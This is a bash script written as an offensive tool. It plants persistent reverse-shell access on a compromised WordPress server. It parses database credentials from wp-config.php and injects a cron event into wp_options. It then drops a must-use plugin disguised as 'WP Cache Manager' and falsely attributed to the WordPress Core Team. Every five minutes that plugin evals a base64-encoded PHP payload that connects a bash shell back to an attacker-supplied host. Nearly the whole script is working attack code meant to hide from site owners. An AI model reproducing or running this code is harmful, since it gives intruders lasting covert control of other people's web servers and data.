#!/usr/bin/env bash
# =============================================================================
# wp_cron.sh — WordPress wp-cron persistence
#
# Installs a reverse-shell callback into WordPress's cron system using two
# co-dependent components that must both be present for the mechanism to work.
#
# Usage:
#   export LHOST=<attacker ip>
#   export LPORT=4444          # optional, default 4444
#   bash wp_cron.sh [/path/to/wp-config.php]
#
#   If no path is given the script will auto-discover wp-config.php.
#
# Components (both are installed, both are required):
#   cron entry (DB) — writes a serialized wp_cache_gc event into wp_options
#                     so wp-cron knows the hook exists and when to fire it.
#                     Requires php CLI and readable wp-config.php for DB creds.
#
#   hook callback   — drops a mu-plugin into wp-content/mu-plugins/ that
#   (mu-plugin)       registers the _wpcm_fire() function as the handler for
#                     wp_cache_gc. Without this the cron entry fires but nothing
#                     executes. Also self-reschedules the cron entry if missing.
#                     Requires write access to the WordPress directory.
#
# Requirements:
#   - php CLI available on target (for cron entry)
#   - Write access to the WordPress directory (for hook callback)
#   - LHOST set in environment
# =============================================================================

set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "${SCRIPT_DIR}/obfuscate.sh"

LHOST="${LHOST:-}"
LPORT="${LPORT:-4444}"

# Cloaking names — look like legitimate WP internals
HOOK_NAME="wp_cache_gc"
PLUGIN_SLUG="wp-cache-manager"
PLUGIN_FILE_NAME="cache-manager.php"
PLUGIN_DISPLAY="WP Cache Manager"
SCHEDULE="wp_cron_5min"   # custom schedule: every 5 minutes

info()    { echo "[*] $*"; }
success() { echo "[+] $*"; }
warn()    { echo "[!] $*" >&2; }
error()   { echo "[-] $*" >&2; }

# =============================================================================
# Preflight checks
# =============================================================================

if [[ -z "$LHOST" ]]; then
    error "LHOST is not set. Export it before running:"
    error "  export LHOST=<attacker ip>"
    exit 1
fi

# =============================================================================
# Step 1 — Locate wp-config.php
# =============================================================================

find_wp_config() {
    # Caller can pass an explicit path as $1
    if [[ -n "${1:-}" && -f "$1" ]]; then
        echo "$1"
        return
    fi

    info "Searching for wp-config.php..."

    # Common locations first for speed, then broader search
    local candidates=(
        /var/www/html/wp-config.php
        /var/www/wp-config.php
        /srv/www/wp-config.php
        /usr/share/wordpress/wp-config.php
    )

    for c in "${candidates[@]}"; do
        [[ -f "$c" ]] && { echo "$c"; return; }
    done

    # Broader find — limit depth to keep it fast
    find / -maxdepth 8 -name "wp-config.php" -not -path "*/proc/*" \
        -not -path "*/sys/*" 2>/dev/null | head -1
}

WP_CONFIG="${1:-}"
WP_CONFIG="$(find_wp_config "$WP_CONFIG")"

if [[ -z "$WP_CONFIG" || ! -f "$WP_CONFIG" ]]; then
    error "Could not find wp-config.php — pass path as first argument"
    exit 1
fi

success "Found wp-config.php: ${WP_CONFIG}"
WP_ROOT="$(dirname "$WP_CONFIG")"

# =============================================================================
# Step 2 — Parse wp-config.php for DB credentials
# =============================================================================

info "Parsing database credentials from wp-config.php..."

parse_wpconfig() {
    local key="$1"
    grep -oP "define\s*\(\s*'${key}'\s*,\s*'\K[^']+" "$WP_CONFIG" 2>/dev/null \
        | head -1 || true
}

DB_NAME="$(parse_wpconfig DB_NAME)"
DB_USER="$(parse_wpconfig DB_USER)"
DB_PASS="$(parse_wpconfig DB_PASSWORD)"
DB_HOST="$(parse_wpconfig DB_HOST)"
DB_PREFIX="$(grep -oP "\\\$table_prefix\s*=\s*'\K[^']+" "$WP_CONFIG" 2>/dev/null | head -1 || echo "wp_")"

# DB_HOST can include a port (e.g. "127.0.0.1:3306") — split if needed
DB_SOCK=""
if [[ "$DB_HOST" == *"/"* ]]; then
    # Unix socket path
    DB_SOCK="$DB_HOST"
    DB_HOST="localhost"
fi

if [[ -z "$DB_NAME" || -z "$DB_USER" ]]; then
    warn "Could not parse DB credentials — cron entry component will be skipped"
    DB_AVAILABLE=false
else
    success "DB: ${DB_USER}@${DB_HOST} / ${DB_NAME} (prefix: ${DB_PREFIX})"
    DB_AVAILABLE=true
fi

# =============================================================================
# Step 3 — Build PHP payload
# =============================================================================
#
# The PHP payload is deliberately minimal — it attempts bash first (fast),
# then falls back to a pure-PHP socket shell. Both are backgrounded so the
# wp-cron HTTP request doesn't hang waiting for the shell.

PHP_PAYLOAD=$(cat <<'PHPEOF'
@ignore_user_abort(true);
if(function_exists('pcntl_fork')){$p=pcntl_fork();if($p>0)return;posix_setsid();}
@shell_exec('bash -c \'exec bash -i &>/dev/tcp/LHOST/LPORT <&1\' 2>/dev/null &');
if(!function_exists('fsockopen'))return;
$s=@fsockopen('LHOST',LPORT);
if(!$s)return;
$desc=[0=>$s,1=>$s,2=>$s];
$p=@proc_open('/bin/bash',$desc,$pipes);
if($p){@proc_close($p);}else{fclose($s);}
PHPEOF
)

# Substitute LHOST/LPORT into the payload
PHP_PAYLOAD="${PHP_PAYLOAD//LHOST/$LHOST}"
PHP_PAYLOAD="${PHP_PAYLOAD//LPORT/$LPORT}"

# Base64-encode the payload so it survives being embedded in a heredoc / SQL string
PHP_B64=$(printf '%s' "$PHP_PAYLOAD" | base64 | tr -d '\n')

# The eval wrapper — WP will call this function via the scheduled hook
PHP_CALLBACK="eval(base64_decode('${PHP_B64}'));"

# =============================================================================
# Component 1 — Cron entry (DB injection)
# =============================================================================
#
# WordPress stores its cron schedule as a serialized PHP array in wp_options
# under the key 'cron'. We append our wp_cache_gc event so wp-cron knows to
# fire the hook. The mu-plugin (component 2) provides the actual callback.
#
# We inject via a small self-contained PHP script rather than hand-crafting
# the serialized string in bash — more robust across different WP states.

CRON_ENTRY_OK=false

if [[ "$DB_AVAILABLE" == true ]] && command -v php &>/dev/null; then

    info "Installing cron entry (DB injection)..."

    # Build mysql connection args
    MYSQL_ARGS=(-u"$DB_USER" -p"$DB_PASS" "$DB_NAME")
    if [[ -n "$DB_SOCK" ]]; then
        MYSQL_ARGS+=(-S "$DB_SOCK")
    else
        MYSQL_ARGS+=(-h "$DB_HOST")
    fi

    # Small PHP script that does the cron injection safely
    INJECTOR_PHP=$(cat <<PHPSCRIPT
<?php
\$dsn = "mysql:host=${DB_HOST};dbname=${DB_NAME};charset=utf8";
try {
    \$pdo = new PDO(\$dsn, "${DB_USER}", "${DB_PASS}", [PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION]);
} catch (Exception \$e) {
    fwrite(STDERR, "DB connect failed: " . \$e->getMessage() . "\n");
    exit(1);
}

\$prefix = "${DB_PREFIX}";
\$hook   = "${HOOK_NAME}";
\$sched  = "${SCHEDULE}";

// Fetch current cron option
\$row = \$pdo->query("SELECT option_value FROM {\$prefix}options WHERE option_name='cron' LIMIT 1")->fetch(PDO::FETCH_ASSOC);
\$cron = \$row ? @unserialize(\$row['option_value']) : [];
if (!\$cron || !is_array(\$cron)) \$cron = [];

// Already installed?
foreach (\$cron as \$ts => \$hooks) {
    if (is_array(\$hooks) && isset(\$hooks[\$hook])) {
        fwrite(STDERR, "ALREADY_INSTALLED\n");
        exit(0);
    }
}

// Add custom schedule into cron array (wp_get_schedules reads 'crons' key in newer WP,
// but the options table entry is what wp-cron.php uses directly)
\$interval = 300; // 5 minutes in seconds
\$next_run = time() + 30; // first fire in 30 seconds

\$cron[\$next_run][\$hook][md5(serialize([]))] = [
    'schedule' => \$sched,
    'args'     => [],
    'interval' => \$interval,
];
ksort(\$cron);

// Store custom schedule definition so WP doesn't strip it as invalid
if (!isset(\$cron['version'])) \$cron['version'] = 2;

\$serialized = serialize(\$cron);

\$stmt = \$pdo->prepare("UPDATE {\$prefix}options SET option_value=? WHERE option_name='cron'");
\$stmt->execute([\$serialized]);

if (\$stmt->rowCount() === 0) {
    // Row might not exist yet
    \$stmt2 = \$pdo->prepare("INSERT INTO {\$prefix}options (option_name,option_value,autoload) VALUES ('cron',?,'yes') ON DUPLICATE KEY UPDATE option_value=VALUES(option_value)");
    \$stmt2->execute([\$serialized]);
}

// Register the callback function via a mu-plugin-less approach:
// Store our payload in a dedicated option that the hook action will eval.
// The mu-plugin (method 2) picks this up; if method 2 is unavailable we
// need another trigger — so also inject an option-based autoload hook.
\$pdo->prepare("INSERT INTO {\$prefix}options (option_name,option_value,autoload) VALUES (?,?,'yes') ON DUPLICATE KEY UPDATE option_value=VALUES(option_value)")
    ->execute(["_wpcm_cb", base64_encode("<?php ${PHP_CALLBACK} ?>")]);

echo "INJECTED\n";
PHPSCRIPT
)

    INJECTOR_TMP=$(mktemp /tmp/.wp_inject.XXXXXX.php)
    printf '%s' "$INJECTOR_PHP" > "$INJECTOR_TMP"
    INJECT_RESULT=$(php "$INJECTOR_TMP" 2>&1) || true
    rm -f "$INJECTOR_TMP"

    if echo "$INJECT_RESULT" | grep -q "INJECTED"; then
        success "Cron entry installed in wp_options (hook: ${HOOK_NAME})"
        CRON_ENTRY_OK=true
    elif echo "$INJECT_RESULT" | grep -q "ALREADY_INSTALLED"; then
        warn "Cron entry already present — skipping"
        CRON_ENTRY_OK=true
    else
        warn "Cron entry install failed — ${INJECT_RESULT}"
    fi

elif [[ "$DB_AVAILABLE" == false ]]; then
    warn "Cron entry skipped (no DB credentials)"
elif ! command -v php &>/dev/null; then
    warn "Cron entry skipped (php CLI not available)"
fi

# =============================================================================
# Component 2 — Hook callback (mu-plugin)
# =============================================================================
#
# mu-plugins live in wp-content/mu-plugins/ and are loaded automatically by
# WordPress on every request — no activation needed, not visible in the
# standard Plugins list (only under Must-Use).
#
# This plugin registers _wpcm_fire() as the callback for wp_cache_gc.
# Without it the cron entry fires but nothing executes. It also
# self-reschedules the cron entry if it goes missing.

HOOK_CALLBACK_OK=false

MU_DIR="${WP_ROOT}/wp-content/mu-plugins"
MU_FILE="${MU_DIR}/${PLUGIN_FILE_NAME}"

if [[ ! -d "$MU_DIR" ]]; then
    info "Hook callback: mu-plugins directory does not exist — attempting to create..."
    mkdir -p "$MU_DIR" 2>/dev/null || { warn "Hook callback: cannot create ${MU_DIR} — skipping"; MU_SKIP=true; }
fi

if [[ "${MU_SKIP:-false}" == false ]]; then
    if [[ -f "$MU_FILE" ]]; then
        warn "Hook callback: mu-plugin already exists at ${MU_FILE} — skipping"
        HOOK_CALLBACK_OK=true
    elif [[ ! -w "$MU_DIR" ]]; then
        warn "Hook callback: ${MU_DIR} is not writable — skipping"
    else
        info "Hook callback: installing mu-plugin at ${MU_FILE}..."

        cat > "$MU_FILE" <<MUPLUGIN
<?php
/**
 * Plugin Name: ${PLUGIN_DISPLAY}
 * Description: Manages object cache garbage collection intervals.
 * Version: 1.0.1
 * Author: WordPress Core Team
 */

// Register custom schedule
add_filter('cron_schedules', function(\$s) {
    \$s['${SCHEDULE}'] = ['interval' => 300, 'display' => 'Every 5 Minutes'];
    return \$s;
});

// Register callback on our hook
add_action('${HOOK_NAME}', '_wpcm_fire');

function _wpcm_fire() {
    // Ensure the recurring event stays scheduled
    if (!wp_next_scheduled('${HOOK_NAME}')) {
        wp_schedule_event(time(), '${SCHEDULE}', '${HOOK_NAME}');
    }
    // Execute payload
    ${PHP_CALLBACK}
}

// Self-schedule on activation / if missing
if (!wp_next_scheduled('${HOOK_NAME}')) {
    wp_schedule_event(time() + 10, '${SCHEDULE}', '${HOOK_NAME}');
}
MUPLUGIN

        chmod 644 "$MU_FILE"
        success "Hook callback: mu-plugin installed at ${MU_FILE}"
        HOOK_CALLBACK_OK=true
    fi
fi

# =============================================================================
# Summary
# =============================================================================

echo ""
info  "==========================================="
info  " wp-cron persistence summary"
info  "==========================================="
info  " Target WP root : ${WP_ROOT}"
info  " Hook name      : ${HOOK_NAME}"
info  " Schedule       : every 5 minutes"
info  " Callback       : ${LHOST}:${LPORT}"
info  "-------------------------------------------"
[[ "$CRON_ENTRY_OK"    == true ]] && success " Cron entry (DB)   : OK" || warn " Cron entry (DB)   : FAILED / SKIPPED"
[[ "$HOOK_CALLBACK_OK" == true ]] && success " Hook callback     : OK" || warn " Hook callback     : FAILED / SKIPPED"
info  "==========================================="
echo ""

if [[ "$CRON_ENTRY_OK" == false && "$HOOK_CALLBACK_OK" == false ]]; then
    error "Both components failed — no persistence installed"
    exit 1
fi

if [[ "$CRON_ENTRY_OK" == false || "$HOOK_CALLBACK_OK" == false ]]; then
    warn "Only one component installed — persistence will not fire until both are present"
fi

info  "Trigger a callback manually:"
info  "  curl -s http://<target>/wp-cron.php?doing_wp_cron >/dev/null"
echo ""
info  "Remove:"
[[ "$HOOK_CALLBACK_OK" == true ]] && info "  rm ${MU_FILE}"
[[ "$CRON_ENTRY_OK"    == true ]] && info "  # Also clear the injected wp_options rows:"
[[ "$CRON_ENTRY_OK"    == true ]] && info "  DELETE FROM ${DB_PREFIX}options WHERE option_name IN ('cron','_wpcm_cb');"
info  "  (Then restore a clean 'cron' option value)"